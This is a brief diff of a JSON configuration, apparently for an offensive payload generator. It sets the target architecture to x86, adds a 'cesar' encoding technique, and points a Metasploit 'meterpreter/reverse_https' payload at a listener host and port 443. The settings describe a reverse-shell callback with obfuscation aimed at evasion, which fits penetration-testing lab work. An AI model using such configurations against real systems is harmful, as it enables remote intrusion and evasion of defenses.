@@ -1,8 +1,9 @@
 {
     "arch": [
-        "x64"
+        "x86"
     ],
-    "lhost": "192.168.45.156",
+    "enc_technique": "cesar",
+    "lhost": "192.168.92.130",
     "lport": 443,
     "msf_payload": "meterpreter/reverse_https",
     "payload_type": [
